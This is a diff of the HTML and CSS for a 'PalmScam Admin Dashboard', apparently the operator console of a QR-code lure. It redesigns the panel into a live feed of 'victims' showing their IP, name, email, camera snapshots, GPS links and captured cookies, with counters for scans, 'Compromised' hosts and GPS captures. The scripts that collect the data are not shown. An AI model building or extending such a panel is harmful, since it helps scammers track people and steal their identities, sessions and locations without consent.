@@ -4,97 +4,142 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PalmScam Admin Dashboard</title>
-    <!-- Include QR Code Library -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <link rel="stylesheet" href="style.css">
-    <!-- Font Awesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        /* Admin-specific overrides */
-        body { margin: 0; padding: 0; background: #0f172a; color: #f8fafc; font-family: 'Inter', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        .admin-header { background: #1e293b; padding: 1.5rem 2rem; border-bottom: 2px solid #ef4444; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); flex-shrink: 0; }
-        .admin-header h1 { margin: 0; font-size: 1.8rem; color: #ef4444; display: flex; align-items: center; gap: 0.75rem; }
-        .live-indicator { display: flex; align-items: center; gap: 0.5rem; color: #10b981; font-weight: 600; font-size: 1.1rem; }
-        .pulse { width: 12px; height: 12px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #060d1a; color: #f8fafc; font-family: 'Inter', sans-serif; min-height: 100vh; }
+
+        /* HEADER */
+        .admin-header {
+            background: #0d1b2e;
+            padding: 1rem 2rem;
+            border-bottom: 2px solid #ef4444;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .admin-header h1 { font-size: 1.5rem; color: #ef4444; display: flex; align-items: center; gap: 0.6rem; }
+        .stats-bar { display: flex; gap: 2rem; }
+        .stat { text-align: center; }
+        .stat-value { font-size: 1.6rem; font-weight: 700; color: #ef4444; }
+        .stat-label { font-size: 0.7rem; color: #64748b; text-transform: uppercase; letter-spacing: 0.05em; }
+        .live-dot {
+            display: flex; align-items: center; gap: 0.5rem;
+            color: #10b981; font-weight: 700; font-size: 0.9rem;
+        }
+        .pulse-dot { width: 10px; height: 10px; background: #10b981; border-radius: 50%; animation: pulsing 1.5s infinite; }
+        @keyframes pulsing { 0% { box-shadow: 0 0 0 0 rgba(16,185,129,.7); } 70% { box-shadow: 0 0 0 10px rgba(16,185,129,0); } 100% { box-shadow: 0 0 0 0 rgba(16,185,129,0); } }
+
+        /* MAIN LAYOUT */
+        .admin-body { display: flex; height: calc(100vh - 65px); }
+
+        /* INCIDENT FEED (LEFT) */
+        .incident-feed {
+            width: 380px;
+            flex-shrink: 0;
+            background: #0d1b2e;
+            border-right: 1px solid #1e3a5f;
+            overflow-y: auto;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+        .feed-title { font-size: 0.75rem; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 0.1em; padding-bottom: 0.5rem; border-bottom: 1px solid #1e3a5f; }
         
-        .admin-layout { display: flex; padding: 1.5rem; gap: 1.5rem; flex: 1; min-height: 0; /* Important for scroll */ max-width: 1600px; margin: 0 auto; width: 100%; box-sizing: border-box; }
-        
-        .panel { background: #1e293b; border-radius: 12px; padding: 1.5rem; border: 1px solid #334155; display: flex; flex-direction: column; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); }
-        .sidebar { width: 320px; flex-shrink: 0; }
-        .main-content { flex: 1; min-width: 0; }
-        
-        h2 { font-size: 1.25rem; font-weight: 600; margin-top: 0; margin-bottom: 1rem; color: #94a3b8; display: flex; align-items: center; gap: 0.5rem; padding-bottom: 0.75rem; border-bottom: 1px solid #334155; }
-        
-        .qr-section { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 1rem; }
-        .qr-container { background: white; padding: 1.5rem; border-radius: 8px; width: fit-content; display: flex; justify-content: center; align-items: center; width: 250px; height: 250px; }
-        #qrcode { width: 200px; height: 200px; display: flex; justify-content: center; align-items: center; } /* Ensure qrcode canvas fits */
-        #qrcode img { max-width: 100%; max-height: 100%; }
-        .server-url { font-family: 'Fira Code', monospace; background: #0f172a; padding: 0.75rem 1rem; border-radius: 6px; font-size: 0.95rem; color: #38bdf8; word-break: break-all; width: 100%; box-sizing: border-box; }
-        
-        .instructions { background: rgba(239, 68, 68, 0.1); border-left: 4px solid #ef4444; padding: 1rem; font-size: 0.9rem; color: #cbd5e1; text-align: left; line-height: 1.5; margin-top: 1rem; }
-        
-        .data-table-container { flex: 1; overflow-y: auto; overflow-x: auto; background: #0f172a; border-radius: 8px; border: 1px solid #334155; }
-        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 0.95rem; }
-        th { position: sticky; top: 0; background: #1e293b; color: #94a3b8; font-weight: 600; padding: 1rem; border-bottom: 1px solid #334155; z-index: 10; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em; }
-        td { padding: 1rem; border-bottom: 1px solid #1e293b; color: #e2e8f0; font-family: 'Fira Code', monospace; }
-        tr:hover td { background: rgba(255, 255, 255, 0.02); }
-        .new-entry { animation: highlight-row 2s ease-out; }
-        @keyframes highlight-row { 0% { background-color: rgba(239, 68, 68, 0.2); } 100% { background-color: transparent; } }
-        
-        .empty-state { padding: 3rem; text-align: center; color: #64748b; font-style: italic; }
-        .empty-state i { font-size: 3rem; margin-bottom: 1rem; opacity: 0.5; }
-        
-        /* Scrollbar styles */
-        ::-webkit-scrollbar { width: 8px; height: 8px; }
-        ::-webkit-scrollbar-track { background: #0f172a; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+        .victim-card {
+            background: #111d2e;
+            border: 1px solid #1e3a5f;
+            border-radius: 10px;
+            padding: 1rem;
+            cursor: pointer;
+            transition: border-color 0.2s, background 0.2s;
+            position: relative;
+        }
+        .victim-card:hover { border-color: #3b82f6; background: #152035; }
+        .victim-card.active { border-color: #ef4444; background: #1a0f0f; }
+        .victim-card.silent-card { border-left: 3px solid #f59e0b; }
+        .victim-card.active-card { border-left: 3px solid #ef4444; }
+        .vc-header { display: flex; justify-content: space-between; align-items: flex-start; gap: 0.5rem; }
+        .vc-ip { font-family: 'Fira Code', monospace; font-size: 0.85rem; color: #93c5fd; font-weight: 700; }
+        .vc-status { font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: 20px; white-space: nowrap; }
+        .status-silent { background: rgba(245,158,11,0.15); color: #f59e0b; }
+        .status-active { background: rgba(239,68,68,0.15); color: #ef4444; }
+        .vc-name { font-size: 0.9rem; font-weight: 600; color: #f8fafc; margin-top: 0.4rem; }
+        .vc-email { font-size: 0.8rem; color: #94a3b8; }
+        .vc-meta { display: flex; gap: 0.75rem; margin-top: 0.6rem; flex-wrap: wrap; }
+        .vc-badge { font-size: 0.72rem; background: rgba(255,255,255,0.06); padding: 2px 7px; border-radius: 4px; color: #94a3b8; }
+        .vc-time { font-size: 0.72rem; color: #475569; position: absolute; top: 10px; right: 10px; }
+        .vc-thumb { width: 100%; height: 90px; object-fit: cover; border-radius: 6px; margin-top: 0.6rem; border: 1px solid #1e3a5f; }
+
+        /* VICTIM DETAIL (RIGHT) */
+        .victim-detail {
+            flex: 1;
+            overflow-y: auto;
+            padding: 1.5rem;
+            background: #080f1c;
+        }
+        .detail-panel {
+            background: #0d1b2e;
+            border: 1px solid #1e3a5f;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        .detail-panel h3 { font-size: 0.85rem; color: #64748b; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 1rem; border-bottom: 1px solid #1e3a5f; padding-bottom: 0.5rem; }
+        .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.85rem; }
+        .detail-field label { font-size: 0.7rem; color: #64748b; text-transform: uppercase; display: block; margin-bottom: 2px; }
+        .detail-field span { font-family: 'Fira Code', monospace; font-size: 0.88rem; color: #e2e8f0; word-break: break-all; }
+        .detail-field span.danger { color: #f87171; }
+        .camera-img { width: 100%; max-height: 350px; object-fit: contain; border-radius: 8px; background: #060d1a; }
+        .gps-link { color: #38bdf8; text-decoration: none; font-size: 0.9rem; }
+        .gps-link:hover { text-decoration: underline; }
+        .cookie-block { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); border-radius: 8px; padding: 0.75rem; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #fca5a5; word-break: break-all; white-space: pre-wrap; }
+        .placeholder-msg { color: #334155; text-align: center; padding: 4rem; font-size: 0.95rem; }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #1e3a5f; border-radius: 4px; }
+
+        /* Slide-in animation for new cards */
+        @keyframes slide-in { from { opacity:0; transform: translateY(-12px); } to { opacity:1; transform: none; } }
+        .slide-in { animation: slide-in 0.4s ease-out; }
     </style>
 </head>
 <body>
 
-    <header class="admin-header">
-        <h1><i class="fa-solid fa-user-secret"></i> PalmScam Admin Dashboard</h1>
-        <div class="live-indicator">
-            <div class="pulse"></div>
-            LIVE INTERCEPTION
-        </div>
-    </header>
+<header class="admin-header">
+    <h1><i class="fa-solid fa-user-secret"></i> PalmScam Admin Dashboard</h1>
+    <div class="stats-bar">
+        <div class="stat"><div class="stat-value" id="total-victims">0</div><div class="stat-label">Total Scans</div></div>
+        <div class="stat"><div class="stat-value" id="active-victims" style="color:#ef4444;">0</div><div class="stat-label">Compromised</div></div>
+        <div class="stat"><div class="stat-value" id="gps-victims" style="color:#10b981;">0</div><div class="stat-label">GPS Captured</div></div>
+    </div>
+    <div class="live-dot"><div class="pulse-dot"></div> LIVE</div>
+</header>
 
-    <div class="admin-layout">
-        <!-- Main Content for Live Data -->
-        <div class="main-content panel">
-            <h2><i class="fa-solid fa-database"></i> Captured Victim Data (<span id="totalCount">0</span>)</h2>
-            <div class="data-table-container">
-                <table id="dataTable">
-                    <thead>
-                        <tr>
-                            <th>Time</th>
-                            <th>IP Address</th>
-                            <th>Status</th>
-                            <th>Browser/OS</th>
-                            <th>Battery</th>
-                            <th>Location</th>
-                        </tr>
-                    </thead>
-                    <tbody id="tableBody">
-                        <tr>
-                            <td colspan="6">
-                                <div class="empty-state">
-                                    <i class="fa-solid fa-radar fa-spin"></i>
-                                    <p>Waiting for victims to scan their palms...</p>
-                                </div>
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
+<div class="admin-body">
+    <div class="incident-feed">
+        <div class="feed-title"><i class="fa-solid fa-satellite-dish"></i> &nbsp;Live Incident Feed</div>
+        <div id="feed-cards">
+            <div class="placeholder-msg" style="padding:2rem 0; color:#334155; font-size:0.85rem;"><i class="fa-solid fa-eye" style="margin-right:6px;"></i>Waiting for victims to scan QR…</div>
         </div>
     </div>
 
-    <script src="admin.js"></script>
+    <div class="victim-detail" id="detail-panel">
+        <div class="placeholder-msg">
+            <i class="fa-solid fa-arrow-left" style="margin-right:0.5rem;"></i>
+            Select a victim from the feed to view their data.
+        </div>
+    </div>
+</div>
+
+<script src="admin.js"></script>
 </body>
 </html>
